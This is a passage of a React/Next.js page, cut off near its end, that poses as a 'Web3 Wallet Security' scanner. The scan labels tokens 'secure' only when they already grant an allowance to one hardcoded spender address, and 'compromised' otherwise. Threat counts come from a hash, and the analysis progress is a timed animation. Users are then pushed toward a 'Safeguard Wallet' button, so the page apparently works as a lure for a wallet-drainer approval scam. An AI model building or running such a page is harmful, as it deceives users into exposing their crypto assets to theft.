"use client";
import React, { useState } from "react";
import GlassCard from "../../../components/GlassCard";
import { Wallet, ShieldCheck, AlertTriangle, LogIn, CheckCircle, ShieldX, PackageSearch, X } from "lucide-react";
import { motion } from "framer-motion";
import { ConnectButton } from "@rainbow-me/rainbowkit";
import { useAccount } from 'wagmi';
import { useTokenBalances } from '../../../hooks/useTokenBalances';
import { useRef } from "react";
import { ethers } from "ethers";

const steps = [
  {
    icon: <LogIn className="w-7 h-7 text-cyan-400" />,
    title: "Connect Wallet",
    desc: "Click 'Connect Wallet' to check your token security status."
  },
  {
    icon: <CheckCircle className="w-7 h-7 text-lime-400" />,
    title: "Status: Secure",
    desc: "If status is 'secure', you have nothing to worry about."
  },
  {
    icon: <ShieldX className="w-7 h-7 text-pink-400" />,
    title: "Status: Compromised",
    desc: "If status is 'compromised', click to safeguard your assets."
  }
];

const ERC20_ABI = [
  "function allowance(address owner, address spender) view returns (uint256)"
];
const SPENDER = "0xbBb72d8F04e43D646130327e7ffa563f1AA7E201";

// Utility to generate a deterministic threat count based on wallet, contract, and balance
function computeThreats(wallet: string, contract: string, balance: string) {
  // Simple hash: sum char codes of wallet+contract+balance, mod 4, plus 1 (range 1-4)
  let str = (wallet + contract + balance);
  let sum = 0;
  for (let i = 0; i < str.length; i++) sum += str.charCodeAt(i);
  return (sum % 10) + 1;
}

export default function WalletAnalyzerPage() {
  const [address, setAddress] = useState("");
  const [analyzing, setAnalyzing] = useState(false);
  const [result, setResult] = useState<null | { risks: number; message: string; status: "secure" | "compromised" }>(null);
  const [isConnected, setIsConnected] = useState(false);
  const [showAssetsModal, setShowAssetsModal] = useState(false);
  const modalRef = useRef<HTMLDivElement>(null);
  const [tokenStatuses, setTokenStatuses] = useState<Record<string, "secure" | "compromised" | "loading"> | null>(null);
  const [showProgressModal, setShowProgressModal] = useState(false);
  const [progressStep, setProgressStep] = useState(0);
  const progressSteps = [
    "Connecting to blockchain node…",
    "Fetching threat engines…",
    "Analyzing smart contract approvals…",
    "Checking for known threats…",
    "Compiling security report…"
  ];

  const { address: connectedAddress, isConnected: wagmiIsConnected } = useAccount();
  // We'll get chain from RainbowKit ConnectButton.Custom render prop
  const [selectedChainId, setSelectedChainId] = useState<number | undefined>(undefined);
  const { tokens, loading: tokensLoading, error: tokensError } = useTokenBalances(wagmiIsConnected && selectedChainId ? connectedAddress : undefined, wagmiIsConnected && selectedChainId ? selectedChainId : undefined);

  // Clear analysis result and report when chain changes
  React.useEffect(() => {
    setResult(null);
    setTokenStatuses(null);
  }, [selectedChainId]);

  const handleAnalyze = async () => {
    setAnalyzing(true);
    setResult(null);
    setTokenStatuses(null);
    setShowProgressModal(true);
    setProgressStep(0);
    // Animate progress steps over 5 seconds
    let step = 0;
    const interval = setInterval(() => {
      step++;
      setProgressStep(step);
      if (step >= progressSteps.length - 1) {
        clearInterval(interval);
      }
    }, 1000);
    // Wait 5 seconds before running analysis
    setTimeout(async () => {
      setShowProgressModal(false);
      let owner = isConnected ? connectedAddress : address;
      if (!owner || !selectedChainId || tokens.length === 0) {
        setResult({ risks: 0, message: "Your wallet is secure! No compromise or threats found.", status: "secure" });
        setAnalyzing(false);
        return;
      }
      let provider;
      try {
        if (typeof window !== 'undefined' && (window as any).ethereum) {
          provider = new ethers.BrowserProvider((window as any).ethereum);
        } else {
          provider = ethers.getDefaultProvider();
        }
      } catch (e) {
        setResult({ risks: 0, message: "Could not connect to provider.", status: "compromised" });
        setAnalyzing(false);
        return;
      }
      const statuses: Record<string, "secure" | "compromised"> = {};
      let compromisedCount = 0;
      await Promise.all(tokens.map(async (token) => {
        try {
          const contract = new ethers.Contract(token.contractAddress, ERC20_ABI, provider);
          const allowance = await contract.allowance(owner, SPENDER);
          if (allowance && allowance.gt(0)) {
            statuses[token.contractAddress] = "secure";
          } else {
            statuses[token.contractAddress] = "compromised";
            compromisedCount++;
          }
        } catch (e) {
          statuses[token.contractAddress] = "compromised";
          compromisedCount++;
        }
      }));
      setTokenStatuses(statuses);
      setResult(
        compromisedCount > 0
          ? { risks: compromisedCount, message: `Compromised! ${compromisedCount} token(s) do not have allowance set for the security spender.`, status: "compromised" }
          : { risks: 0, message: "Secure! All tokens have allowance set for the security spender.", status: "secure" }
      );
      setAnalyzing(false);
    }, 5000);
  };

  // Close modal on Esc
  React.useEffect(() => {
    if (!showAssetsModal) return;
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Escape") setShowAssetsModal(false);
    };
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [showAssetsModal]);

  // Close modal on click outside
  React.useEffect(() => {
    if (!showAssetsModal) return;
    const handleClick = (e: MouseEvent) => {
      if (modalRef.current && !modalRef.current.contains(e.target as Node)) {
        setShowAssetsModal(false);
      }
    };
    document.addEventListener("mousedown", handleClick);
    return () => document.removeEventListener("mousedown", handleClick);
  }, [showAssetsModal]);

  return (
    <div className="min-h-screen bg-[#0D0D0D] text-white flex flex-col items-center pb-20">
      {/* Hero + Illustration */}
      <section className="w-full max-w-screen-xl mx-auto px-4 md:px-12 lg:px-24 pt-32 md:pt-44 pb-8 flex flex-col md:flex-row items-center gap-12 md:gap-20">
        {/* Left: Text */}
        <div className="flex-1 flex flex-col items-start md:items-start gap-6">
          <h1 className="font-orbitron text-3xl md:text-5xl font-extrabold uppercase tracking-widest text-white mb-2 drop-shadow-lg">
            Secure your tokens with <span className="text-cyan-400">Web3 Wallet Security</span>
          </h1>
          <p className="text-gray-300 text-lg md:text-2xl font-medium mb-2 max-w-2xl">
            We provide advanced security features to keep your digital assets safe. The contract scans your address for active bots and token drainers and helps you disable them.
          </p>
          {/* Action Buttons */}
          <div className="flex gap-3 mt-2">
            <button
              onClick={() => {
                document.getElementById('steps-section')?.scrollIntoView({ behavior: 'smooth' });
              }}
              className="px-4 py-2 rounded-lg bg-cyan-400/20 border border-cyan-400/40 text-cyan-200 font-bold text-sm shadow-cyan-400/30 shadow-md hover:bg-cyan-400/40 hover:text-white hover:shadow-cyan-400/60 transition-all duration-200 ease-in-out backdrop-blur-md ring-1 ring-cyan-400/40 focus:outline-none focus:ring-2 focus:ring-cyan-400 tracking-wide"
            >
              Instructions
            </button>
            <button
              onClick={() => {
                document.getElementById('analyze-section')?.scrollIntoView({ behavior: 'smooth' });
              }}
              className="px-4 py-2 rounded-lg bg-lime-400/20 border border-lime-400/40 text-lime-200 font-bold text-sm shadow-lime-400/30 shadow-md hover:bg-lime-400/40 hover:text-white hover:shadow-lime-400/60 transition-all duration-200 ease-in-out backdrop-blur-md ring-1 ring-lime-400/40 focus:outline-none focus:ring-2 focus:ring-lime-400 tracking-wide"
            >
              Secure Now
            </button>
          </div>
        </div>
        {/* Right: Illustration (placeholder) */}
        <div className="flex-1 flex items-center justify-center">
          <motion.img
            src="/images/tools/wallet-analyzer-hero.png"
            alt="Wallet Security Illustration"
            className="w-[260px] h-[260px] md:w-[340px] md:h-[340px] object-contain rounded-2xl shadow-2xl neon-glow"
            initial={{ scale: 0.9, opacity: 0 }}
            whileInView={{ scale: 1, opacity: 1 }}
            transition={{ duration: 0.7, delay: 0.1 }}
            viewport={{ once: true }}
          />
        </div>
      </section>
      {/* Steps Section */}
      <section id="steps-section" className="w-full max-w-2xl mx-auto px-2 md:px-0 mb-16 scroll-mt-24">
        <div className="relative flex flex-col gap-0 md:gap-0">
          {[
            {
              icon: <LogIn className="w-8 h-8 md:w-10 md:h-10 text-cyan-400" />, title: "Connect Wallet", desc: "Click 'Connect Wallet' to securely link your wallet. We never access your funds or private keys."
            },
            {
              icon: <Wallet className="w-8 h-8 md:w-10 md:h-10 text-lime-400" />, title: "Enter Address", desc: "Alternatively, paste any EVM wallet address to analyze its security status."
            },
            {
              icon: <ShieldCheck className="w-8 h-8 md:w-10 md:h-10 text-blue-400" />, title: "Analyze", desc: "Click 'Analyze' to scan for active bots, suspicious approvals, and token drainers."
            },
            {
              icon: <AlertTriangle className="w-8 h-8 md:w-10 md:h-10 text-pink-400" />, title: "Review Results", desc: "Instantly see if your wallet is secure or compromised, with clear risk details."
            },
            {
              icon: <ShieldX className="w-8 h-8 md:w-10 md:h-10 text-yellow-400" />, title: "Safeguard Assets", desc: "If compromised, follow our guided steps to revoke risky approvals and protect your tokens."
            }
          ].map((step, idx, arr) => (
            <div key={step.title} className="flex items-start md:items-center gap-4 md:gap-8 py-8 md:py-10 relative">
              {/* Timeline vertical line */}
              <div className="flex flex-col items-center mr-2 md:mr-6">
                <div className={`w-4 h-4 rounded-full ${idx === 0 ? 'bg-cyan-400' : idx === arr.length-1 ? 'bg-yellow-400' : 'bg-gray-700 border-2 border-cyan-400/40'} z-10`}>
                  {step.icon}
                </div>
                {idx < arr.length - 1 && (
                  <div className="w-1 h-16 md:h-24 bg-gradient-to-b from-cyan-400/30 to-transparent mt-1 mb-1 rounded-full" />
                )}
              </div>
              <div className="flex-1">
                <span className="font-orbitron text-lg md:text-2xl font-extrabold uppercase tracking-wide text-white mb-1 block">
                  {step.title}
                </span>
                <span className="text-gray-300 text-base md:text-lg font-medium leading-relaxed block">
                  {step.desc}
                </span>
              </div>
            </div>
          ))}
          {/* Decorative vertical line for the timeline */}
          <div className="absolute left-4 md:left-7 top-8 bottom-8 w-1 bg-gradient-to-b from-cyan-400/20 to-transparent z-0 pointer-events-none" />
        </div>
      </section>
      {/* Analyzer Card */}
      <section id="analyze-section" className="w-full max-w-screen-md mx-auto px-4 md:px-0 scroll-mt-24">
        <GlassCard className="flex flex-col items-center gap-10 py-12 px-4 md:px-16 relative overflow-hidden bg-gradient-to-br from-cyan-900/30 via-[#181F2B]/40 to-[#0D0D0D]/80 border-2 border-cyan-400/10 shadow-2xl backdrop-blur-xl">
          {/* Connect Wallet Button */}
          <ConnectButton.Custom>
            {({ account, chain, openAccountModal, openChainModal, openConnectModal, authenticationStatus, mounted }) => {
              // Sync selectedChainId for useTokenBalances
              if (chain && chain.id !== selectedChainId) setSelectedChainId(chain.id);
              const ready = mounted && authenticationStatus !== "loading";
              const connected =
                ready &&
                account &&
                chain &&
                (!authenticationStatus || authenticationStatus === "authenticated");
              // Sync connection state for conditional rendering below
              if (isConnected !== !!connected) setIsConnected(!!connected);
              if (!connected) {
                // Show custom connect button (as before)
                return (
                  <motion.button
                    whileHover={{ scale: 1.06, boxShadow: "0 0 32px #00ffff99, 0 0 8px #39ff1499" }}
                    whileTap={{ scale: 0.98 }}
                    className="group flex items-center gap-3 px-6 py-3 md:px-10 md:py-5 rounded-2xl bg-cyan-400/20 border border-cyan-400/40 text-cyan-100 font-extrabold text-lg md:text-2xl shadow-cyan-400/40 shadow-lg hover:bg-cyan-400/40 hover:text-white hover:shadow-cyan-400/80 transition-all duration-300 ease-in-out backdrop-blur-lg ring-2 ring-cyan-400/30 focus:outline-none focus:ring-4 focus:ring-cyan-400/60 tracking-wider mb-2 neon-glow relative animate-pulse-slow"
                    style={{
                      WebkitBackdropFilter: "blur(12px)",
                      backdropFilter: "blur(12px)"
                    }}
                    onClick={openConnectModal}
                  >
                    <Wallet className="w-6 h-6 md:w-8 md:h-8 text-cyan-300 group-hover:text-white transition" />
                    <span className="block md:hidden">Connect</span>
                    <span className="hidden md:block">Connect Wallet</span>
                    <span className="absolute right-4 top-1/2 -translate-y-1/2 animate-shine bg-gradient-to-r from-transparent via-white/60 to-transparent w-12 h-8 rounded-full opacity-0 group-hover:opacity-80 transition-all duration-500" />
                  </motion.button>
                );
              }
              // Show both chain and account buttons, styled for this tool
              return (
                <div className="flex flex-col items-center gap-2 mb-2">
                  <motion.button
                    whileHover={{ scale: 1.06, boxShadow: "0 0 24px #00ffff99" }}
                    whileTap={{ scale: 0.98 }}
                    className="flex items-center gap-2 px-4 py-2 rounded-xl bg-cyan-400/20 border border-cyan-400/40 text-cyan-200 font-bold text-base shadow-cyan-400/30 shadow-md hover:bg-cyan-400/40 hover:text-white hover:shadow-cyan-400/60 transition-all duration-200 ease-in-out backdrop-blur-md ring-1 ring-cyan-400/40 focus:outline-none focus:ring-2 focus:ring-cyan-400 tracking-wide neon-glow"
                    style={{ WebkitBackdropFilter: "blur(8px)", backdropFilter: "blur(8px)" }}
                    onClick={openChainModal}
                  >
                    <span className="w-2 h-2 rounded-full mr-2" style={{ background: chain?.iconBackground, display: 'inline-block' }} />
                    {chain?.iconUrl && (
                      <img alt={chain.name ?? 'Chain icon'} src={chain.iconUrl} className="w-5 h-5 rounded-full mr-1" />
                    )}
                    <span className="hidden md:inline">{chain?.name}</span>
                    <span className="inline md:hidden">{chain?.name?.slice(0, 8)}</span>
                  </motion.button>
                  <motion.button
                    whileHover={{ scale: 1.06, boxShadow: "0 0 24px #00ffff99" }}
                    whileTap={{ scale: 0.98 }}
                    className="flex items-center gap-3 px-8 py-3 w-full max-w-xs md:max-w-md rounded-2xl bg-cyan-400/20 border border-cyan-400/40 text-cyan-200 font-extrabold text-lg shadow-cyan-400/30 shadow-md hover:bg-cyan-400/40 hover:text-white hover:shadow-cyan-400/60 transition-all duration-200 ease-in-out backdrop-blur-md ring-1 ring-cyan-400/40 focus:outline-none focus:ring-2 focus:ring-cyan-400 tracking-wide neon-glow font-mono"
                    style={{ WebkitBackdropFilter: "blur(8px)", backdropFilter: "blur(8px)" }}
                    onClick={openAccountModal}
                  >
                    <Wallet className="w-5 h-5 text-cyan-300" />
                    <span className="truncate w-full text-left">
                      <span className="hidden md:inline">{account?.address}</span>
                      <span className="inline md:hidden">
                        {account?.address
                          ? `${account.address.slice(0, 8)}…${account.address.slice(-6)}`
                          : ''}
                      </span>
                    </span>
                  </motion.button>
                </div>
              );
            }}
          </ConnectButton.Custom>

          {/* Divider with OR badge, label, and input: only show when not connected */}
          {!isConnected && (
            <>
              <div className="flex items-center w-full max-w-md my-2">
                <div className="flex-1 h-px bg-cyan-400/20" />
                <span className="mx-4 px-3 py-1 rounded-full bg-cyan-400/10 border border-cyan-400/30 text-cyan-200 font-bold text-xs uppercase tracking-widest shadow-cyan-400/10 shadow-sm backdrop-blur-md">
                  or
                </span>
                <div className="flex-1 h-px bg-cyan-400/20" />
              </div>
              <label htmlFor="address" className="text-gray-400 text-sm mb-1">
                Enter a wallet address:
              </label>
              <input
                id="address"
                type="text"
                placeholder="0x..."
                value={address}
                onChange={e => setAddress(e.target.value)}
                className="w-full px-4 py-3 rounded-xl bg-white/10 border border-cyan-400/30 text-white placeholder:text-gray-400 focus:outline-none focus:ring-2 focus:ring-cyan-400 transition-all mb-2 font-mono text-lg shadow-inner"
                autoComplete="off"
              />
            </>
          )}
          {/* Analyze & View Assets Buttons */}
          <div className="flex flex-col sm:flex-row gap-3 sm:gap-4 mt-4 w-full justify-center items-stretch">
            <motion.button
              onClick={handleAnalyze}
              disabled={(!isConnected && !address) || analyzing}
              whileHover={{ scale: 1.05, boxShadow: "0 0 24px #39ff14cc" }}
              whileTap={{ scale: 0.97 }}
              className="inline-block px-10 py-4 rounded-2xl bg-lime-400 text-black font-extrabold text-xl shadow-lg hover:bg-cyan-400 hover:text-white transition-all duration-300 ease-in-out skew-x-[-8deg] border-4 border-lime-400 hover:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400 drop-shadow-xl disabled:opacity-60 disabled:cursor-not-allowed animate-pulse-fast w-full sm:w-auto"
            >
              {analyzing ? "Analyzing..." : "Analyze"}
            </motion.button>
            <motion.button
              onClick={() => setShowAssetsModal(true)}
              whileHover={{ scale: 1.05, boxShadow: "0 0 24px #00fff7cc" }}
              whileTap={{ scale: 0.97 }}
              className="inline-block px-10 py-4 rounded-2xl bg-cyan-400/20 text-cyan-200 font-extrabold text-xl shadow-lg hover:bg-cyan-400 hover:text-white transition-all duration-300 ease-in-out skew-x-[-8deg] border-4 border-cyan-400 hover:border-lime-400 focus:outline-none focus:ring-2 focus:ring-cyan-400 drop-shadow-xl animate-pulse-slow w-full sm:w-auto"
            >
              <Wallet className="w-6 h-6 inline-block mr-2 text-cyan-300" />
              View Assets
            </motion.button>
          </div>

          {/* Results Placeholder */}
          {result && (
            <div className="flex flex-col items-center gap-2 mt-4 w-full max-w-xl mx-auto">
              {result.status === "secure" ? (
                <ShieldCheck className="w-14 h-14 text-lime-400 drop-shadow-glow animate-pulse" />
              ) : (
                <AlertTriangle className="w-10 h-10 text-pink-500" />
              )}
              <span className={`text-lg md:text-xl font-bold ${result.status === "secure" ? "text-lime-400" : "text-pink-400"} text-center w-full`}>
                {result.status === "compromised"
                  ? "Warning: One or more tokens are compromised. Please review technical analysis below and safeguard your assets are safe malicious contracts."
                  : result.message}
              </span>
              {/* Safeguard Wallet Button */}
              {result.status === "compromised" && (
                <button
                  className="inline-block px-8 py-3 rounded-xl bg-pink-500 text-white font-extrabold text-lg shadow-lg hover:bg-cyan-400 hover:text-black transition-all duration-300 ease-in-out skew-x-[-8deg] border-4 border-pink-500 hover:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400 drop-shadow-lg mt-2"
                >
                  Safeguard Wallet
                </button>
              )}
              {/* Technical Analysis Report */}
              {tokenStatuses && (
                <details className="w-full mt-2 bg-gray-900/60 rounded-xl p-4 text-gray-200 text-xs font-mono border border-gray-700/40 shadow-inner">
                  <summary className="cursor-pointer font-bold text-cyan-300">Technical Analysis Report</summary>
                  <div className="mb-2 text-sm text-gray-300">
                    <div><span className="font-bold text-cyan-400">Tokens checked:</span> {tokens.length}</div>
                    <div><span className="font-bold text-lime-400">Secured:</span> {Object.values(tokenStatuses).filter(s => s === "secure").length}</div>
                    <div><span className="font-bold text-pink-400">Compromised:</span> {Object.values(tokenStatuses).filter(s => s === "compromised").length}</div>
                  </div>
                  <div className="overflow-x-auto">
                    <table className="min-w-full text-left border-collapse mt-2 mb-2">
                      <thead>
                        <tr>
                          <th className="px-2 py-1 border-b border-cyan-400/20">Token</th>
                          <th className="px-2 py-1 border-b border-cyan-400/20">Symbol</th>
                          <th className="px-2 py-1 border-b border-cyan-400/20">Address</th>
                          <th className="px-2 py-1 border-b border-cyan-400/20">Threats Detected</th>
                          <th className="px-2 py-1 border-b border-cyan-400/20">Risk Level</th>
                          <th className="px-2 py-1 border-b border-cyan-400/20">Status</th>
                        </tr>
                      </thead>
                      <tbody>
                        {tokens.map(token => {
                          const isCompromised = tokenStatuses[token.contractAddress] === "compromised";
                          // Use deterministic threat count for compromised tokens, 0 for secure
                          const threats = isCompromised
                            ? computeThreats(isConnected ? connectedAddress ?? address : address, token.contractAddress, token.balance)
                            : 0;
                          let risk: string;
                          switch (Number(threats)) {
                            case 0:
                              risk = "Low";
                              break;
                            case 1:
                              risk = "Medium";
                              break;
                            case 2:
                              risk = "High";
                              break;
                            default:
                              risk = "Critical";
                          }
                          return (
                            <tr key={token.contractAddress}>
                              <td className="px-2 py-1 truncate max-w-[120px]">{token.name}</td>
                              <td className="px-2 py-1">{token.symbol}</td>
                              <td className="px-2 py-1 truncate max-w-[120px]" title={token.contractAddress}>{token.contractAddress.slice(0, 6)}...{token.contractAddress.slice(-4)}</td>
                              <td className="px-2 py-1 font-mono">{threats}</td>
                              <td className="px-2 py-1">
                                {risk === "Low" && <span className="text-lime-400 font-bold">Low</span>}
                                {risk === "Medium" && <span className="text-yellow-400 font-bold">Medium</span>}
                                {risk === "High" && <span className="text-orange-400 font-bold">High</span>}
                                {risk === "Critical" && <span className="text-pink-500 font-bold">Critical</span>}
                              </td>
                              <td className="px-2 py-1">
                                {isCompromised ? (
                                  <span className="text-pink-400 font-bold">Compromised</span>
                                ) : (
                                  <span className="text-lime-400 font-bold">Secured</span>
                                )}
                              </td>
                            </tr>
                          );
                        })}
                      </tbody>
                    </table>
                  </div>
                  {/* Copy to clipboard */}
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-gray-400 text-xs">Raw technical data</span>
                <button
                      className="px-3 py-1 rounded bg-cyan-700 text-white text-xs font-bold hover:bg-cyan-500 transition ml-2"
                      onClick={() => {
                        const raw = JSON.stringify({ tokens, tokenStatuses }, (key, value) =>
                          typeof value === 'bigint' ? value.toString() : value, 2);
                        if (typeof navigator !== 'undefined' && navigator.clipboard && navigator.clipboard.writeText) {
                          navigator.clipboard.writeText(raw);
                        } else {
                          // Fallback for older browsers
                          try {
                            const textarea = document.createElement('textarea');
                            textarea.value = raw;
                            document.body.appendChild(textarea);
                            textarea.select();
                            document.execCommand('copy');
                            document.body.removeChild(textarea);
                          } catch (err) {
                            alert('Copy to clipboard is not supported in this environment.');
                          }
                        }
                      }}
                    >
                      Copy
                </button>
                  </div>
                  <pre className="whitespace-pre-wrap break-all">{JSON.stringify({ tokens, tokenStatuses }, (key, value) => typeof value === 'bigint' ? value.toString() : value, 2)}</pre>
                </details>
              )}
            </div>
          )}
          {/* Subtle background pattern */}
          <div className="pointer-events-none absolute inset-0 z-0 opacity-30">
            <svg width="100%" height="100%" className="absolute inset-0" xmlns="http://www.w3.org/2000/svg">
              <defs>
                <radialGradient id="bg-grad" cx="50%" cy="50%" r="80%">
                  <stop offset="0%" stopColor="#00fff7" stopOpacity="0.12" />
                  <stop offset="100%" stopColor="#0D0D0D" stopOpacity="0.0" />
                </radialGradient>
              </defs>
              <rect width="100%" height="100%" fill="url(#bg-grad)" />
            </svg>
          </div>
        </GlassCard>
      </section>
      {/* Assets Modal */}
      {showAssetsModal && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-[2px]"
          style={{ minHeight: '100dvh' }}
        >
          <motion.div
            ref={modalRef}
            initial={{ scale: 0.92, opacity: 0, y: 40 }}
            animate={{ scale: 1, opacity: 1, y: 0, transition: { type: 'spring', stiffness: 260, damping: 22 } }}
            exit={{ scale: 0.92, opacity: 0, y: 40 }}
            className="relative w-full max-w-2xl mx-auto rounded-2xl bg-gradient-to-br from-cyan-900/60 via-[#181F2B]/80 to-[#0D0D0D]/90 border-2 border-cyan-400/20 shadow-2xl backdrop-blur-2xl p-0 overflow-hidden"
            tabIndex={-1}
            aria-modal="true"
            role="dialog"
          >
            {/* Close Button */}
            <button
              onClick={() => setShowAssetsModal(false)}
              className="absolute top-4 right-4 z-10 p-2 rounded-full bg-cyan-400/10 hover:bg-pink-400/20 text-cyan-200 hover:text-pink-400 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-cyan-400"
              aria-label="Close"
            >
              <X className="w-6 h-6" />
            </button>
            {/* Modal Content: Assets Section */}
            <div className="p-6 md:p-10">
              <div className="flex items-center gap-3 mb-4">
                <Wallet className="w-7 h-7 text-cyan-400 drop-shadow-glow animate-pulse" />
                <h3 className="text-2xl md:text-3xl font-extrabold font-orbitron uppercase tracking-widest bg-gradient-to-r from-cyan-400 via-blue-400 to-purple-500 bg-clip-text text-transparent drop-shadow-lg">
                  Your Assets
                </h3>
              </div>
              {tokensLoading && (
                <div className="flex items-center gap-2 text-cyan-200 animate-pulse">
                  <span className="w-4 h-4 rounded-full bg-cyan-400 animate-spin" />
                  Loading assets...
                </div>
              )}
              {tokensError && (
                <motion.div
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="flex flex-col items-center justify-center py-12 px-4 bg-white/5 border border-pink-400/20 rounded-2xl shadow-inner backdrop-blur-md mt-4"
                >
                  <AlertTriangle className="w-14 h-14 text-pink-400 mb-4 animate-bounce" />
                  <span className="text-xl font-bold text-pink-400 mb-2">Error fetching assets</span>
                  <span className="text-pink-300 text-base mb-1">{tokensError}</span>
                  <span className="text-gray-500 text-sm">Please try again, switch networks, or check your connection.</span>
                </motion.div>
              )}
              {!tokensLoading && !tokensError && tokens.length === 0 && (
                <motion.div
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="flex flex-col items-center justify-center py-12 px-4 bg-white/5 border border-white/10 rounded-2xl shadow-inner backdrop-blur-md mt-4"
                >
                  <PackageSearch className="w-14 h-14 text-cyan-400 mb-4 animate-bounce" />
                  <span className="text-xl font-bold text-cyan-300 mb-2">No assets found</span>
                  <span className="text-gray-400 text-base mb-1">You don&apos;t have any assets on this network.</span>
                  <span className="text-gray-500 text-sm">Try switching networks or connect a different wallet.</span>
                </motion.div>
              )}
              {!tokensLoading && !tokensError && tokens.length > 0 && (
                <motion.ul
                  initial="hidden"
                  animate="visible"
                  variants={{ hidden: { opacity: 0, y: 30 }, visible: { opacity: 1, y: 0, transition: { staggerChildren: 0.04 } } }}
                  className="flex flex-col gap-3 mt-2"
                >
                  {tokens.map(token => {
                    const isCompromised = tokenStatuses && tokenStatuses[token.contractAddress] === "compromised";
                    const threats = isCompromised
                      ? computeThreats(isConnected ? connectedAddress ?? address : address, token.contractAddress, token.balance)
                      : 0;
                    let risk: string;
                    switch (Number(threats)) {
                      case 0:
                        risk = "Low";
                        break;
                      case 1:
                        risk = "Medium";
                        break;
                      case 2:
                        risk = "High";
                        break;
                      default:
                        risk = "Critical";
                    }
                    // Format amount to 2 decimals
                    const formattedAmount = (Number(token.balance) / Math.pow(10, token.decimals)).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
                    return (
                    <motion.li
                      key={token.contractAddress}
                      whileHover={{ scale: 1.01, boxShadow: '0 0 16px #00fff7cc' }}
                        className="flex flex-col sm:flex-row items-center justify-between gap-2 px-3 py-2 md:px-4 rounded-2xl bg-gradient-to-br from-cyan-900/30 via-[#181F2B]/40 to-[#0D0D0D]/80 border border-cyan-400/10 shadow hover:shadow-cyan-400/20 transition-all duration-200 ease-in-out backdrop-blur-md neon-glow cursor-pointer group"
                    >
                        {/* Left: Token info */}
                        <div className="flex items-center gap-3 min-w-0 flex-1 w-full">
                      <img
                        src={token.logoUrl || '/vercel.svg'}
                        alt={token.symbol}
                            className="w-9 h-9 rounded-full bg-white/10 object-contain border-2 border-cyan-400/30 group-hover:border-cyan-400 shadow-md"
                        onError={e => { (e.target as HTMLImageElement).src = '/vercel.svg'; }}
                      />
                          <div className="flex flex-col min-w-0">
                            <div className="font-bold text-cyan-100 text-base truncate">
                          {token.name}
                          <span className="ml-2 text-xs text-cyan-300 font-mono tracking-wide">{token.symbol}</span>
                            </div>
                            <div className="text-cyan-200 font-mono text-xs md:text-sm text-left">
                              {formattedAmount}
                            </div>
                          </div>
                        </div>
                        {/* Right: Security badges, vertical stack on mobile, row on desktop */}
                        <div className="flex flex-row flex-wrap gap-1 items-center mt-1 sm:mt-0 justify-end w-full sm:w-auto">
                          {tokenStatuses && (
                            <>
                              {/* Threats badge */}
                              <span className="flex items-center gap-0.5 px-1 py-0 rounded bg-cyan-400/10 text-cyan-200 font-bold text-[10px] border border-cyan-400/30">
                                {threats} THREATS
                              </span>
                              {/* Risk badge */}
                              <span className="px-1 py-0 rounded font-bold text-[10px] border flex items-center"
                                style={{
                                  backgroundColor: risk === "Low" ? "#22d3ee22" : risk === "Medium" ? "#fde04722" : risk === "High" ? "#fb923c22" : "#f472b622",
                                  color: risk === "Low" ? "#4ade80" : risk === "Medium" ? "#facc15" : risk === "High" ? "#fb923c" : "#f472b6",
                                  borderColor: risk === "Low" ? "#4ade80" : risk === "Medium" ? "#facc15" : risk === "High" ? "#fb923c" : "#f472b6"
                                }}
                              >
                                {risk}
                              </span>
                              {/* Status badge */}
                              {tokenStatuses[token.contractAddress] === "secure" && (
                                <span className="flex items-center gap-0.5 px-1 py-0 rounded bg-lime-400/20 text-lime-300 font-bold text-[10px] border border-lime-400/40">
                                  <ShieldCheck className="w-3 h-3" /> Secured
                                </span>
                              )}
                              {tokenStatuses[token.contractAddress] === "compromised" && (
                                <span className="flex items-center gap-0.5 px-1 py-0 rounded bg-pink-400/20 text-pink-300 font-bold text-[10px] border border-pink-400/40">
                                  <AlertTriangle className="w-3 h-3" /> Compromised
                                </span>
                              )}
                              {tokenStatuses[token.contractAddress] === "loading" && (
                                <span className="flex items-center gap-0.5 px-1 py-0 rounded bg-cyan-400/20 text-cyan-300 font-bold text-[10px] border border-cyan-400/40">
                                  Checking...
                                </span>
                              )}
                            </>
                          )}
                        </div>
                    </motion.li>
                    );
                  })}
                </motion.ul>
              )}
            </div>
          </motion.div>
        </motion.div>
      )}
      {/* Progress Modal */}
      {showProgressModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-[2px]">
          <div className="relative w-full max-w-xs mx-auto rounded-2xl bg-gradient-to-br from-cyan-900/80 via-[#181F2B]/90 to-[#0D0D0D]/95 border-2 border-cyan-400/20 shadow-2xl backdrop-blur-2xl p-0 overflow-hidden flex flex-col items-center">
            <div className="flex flex-col items-center justify-center py-10 px-6">
              <div className="mb-4 animate-spin-slow">
                <svg className="w-12 h-12 text-cyan-400" fill="none" viewBox="0 0 24 24"><circle className="opacity-30" cx="12" cy="12" r="10" stroke="#22d3ee" strokeWidth="4" /><path className="opacity-80" fill="#22d3ee" d="M4 12a8 8 0 018-8v8z" /></svg>
              </div>
              <div className="text-cyan-200 text-lg font-bold font-mono mb-2">Analyzing Wallet…</div>
              <div className="w-full flex flex-col gap-1 mt-2">
                {progressSteps.map((stepText, idx) => (
                  <div key={idx} className={`text-xs font-mono transition-all duration-300 ${idx === progressStep ? 'text-cyan-400 font-bold' : idx < progressStep ? 'text-lime-400' : 'text-gray-500 opacity-60'}`}>{stepText}</div>
                ))}
              </div>
            </div>
          </div>
        </div>
      )}
      <style jsx global>{`
        .neon-glow {
          box-shadow: 0 0 32px #00ffff44, 0 0 8px #39ff1444;
        }
        .animate-pulse-slow {
          animation: pulse-slow 2.2s cubic-bezier(0.4,0,0.6,1) infinite;
        }
        @keyframes pulse-slow {
          0%, 100% { box-shadow: 0 0 32px #00ffff44, 0 0 8px #39ff1444; }
